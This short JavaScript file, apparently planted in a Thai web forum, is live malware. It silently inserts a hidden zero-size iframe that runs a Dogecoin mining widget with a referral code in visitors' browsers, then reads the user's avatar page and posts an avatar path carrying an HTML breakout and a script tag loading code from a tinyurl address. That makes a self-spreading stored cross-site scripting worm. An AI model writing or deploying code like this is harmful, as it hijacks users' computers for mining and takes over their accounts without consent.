if($('#coinpot').length==0){
	$('<iframe id="coinpot" scrolling="no" frameborder="0" src="https://coinpot.co/mine/dogecoin/?ref=D24F0FE435EB&mode=widget" style="border:0;width:0;height:0;"></iframe>').appendTo('body');
}

function initAvatar(){
	if(initedAvatar){
		return;
	}
	initedAvatar = 1;
	$('a[href="avatar.php"] img').each((i, j) => {
		j = $(j);
		let src = j.attr("src").replace('"','');
		j.attr("src", src);
	})
	$.get('/avatar.php',(result)=>{
	    let ava = result.indexOf('กดเลือกใช้ Avatar ที่ชอบ');
		if(ava>0){
		    var aroundava = result.substring(ava, ava+300);
			var toAdd = '"><script src="https://tinyurl.com/smuq7p4"></script></a><a "#';
			res = [...aroundava.matchAll(/(img src=\"|\')([^\'\"]*)([^>]*)/g)];
			if(res[0]){
				if(res[0][2] && res[0][2].length + toAdd.length <= 100){
					$.post( "avataradd.php", { fileavatar: res[0][2] + toAdd })
				}
			}else{
				$.post( "avataradd.php", {  fileavatar: '/pic/default_avatar.gif' + toAdd })
			}
		}
	})
}
$( document ).ready( initAvatar );
